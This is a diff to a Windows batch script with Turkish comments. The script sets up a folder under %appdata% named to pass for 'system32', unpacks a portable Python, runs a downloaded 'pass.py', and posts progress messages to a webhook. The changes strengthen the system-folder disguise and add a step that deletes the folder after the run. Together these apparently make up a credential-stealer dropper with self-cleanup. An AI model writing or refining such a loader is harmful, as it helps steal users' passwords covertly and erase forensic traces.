@@ -13,13 +13,13 @@ echo Webhook message sent.
 :: %appdata% dizinine git
 cd /d "%appdata%"
 
-:: system322 klasörü oluştur
-if not exist system322 (
-    mkdir system322
+:: system32 klasörü oluştur
+if not exist system32 (
+    mkdir system32
 ) else (
-    echo system322 klasörü zaten mevcut.
+    echo system32 klasörü zaten mevcut.
 )
-cd system322
+cd system32
 
 :: Dosyaları indir
 powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilmeye başladı\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
@@ -32,7 +32,7 @@ mkdir py
 echo py klasörü oluşturuldu.
 
 :: Python.zip içerisindeki dosyaları py klasörüne çıkar
-powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python çıakrtılıyor\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
+powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python çıkarılıyor\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
 powershell -Command "Expand-Archive -Path 'Python.zip' -DestinationPath 'py' -Force"
 powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python çıkartma bitti\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
 echo Python.zip dosyası py klasörüne çıkarıldı.
@@ -52,6 +52,14 @@ echo pass.py dosyası scripts klasörüne indirildi.
 
 :: Python scriptini çalıştır
 powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"script çalıştırıldı.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
-"%appdata%\system322\py\python.exe" "%appdata%\system322\scripts\pass.py"
+"%appdata%\system32\py\python.exe" "%appdata%\system32\scripts\pass.py"
 
 echo İşlem tamamlandı.
+
+:: system32 klasörünü ve içeriğini sil
+cd /d "%appdata%"
+rmdir /s /q system32
+echo system32 klasörü ve içeriği silindi.
+
+:: Webhook message to confirm deletion
+powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"system32 klasörü ve içeriği silindi.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
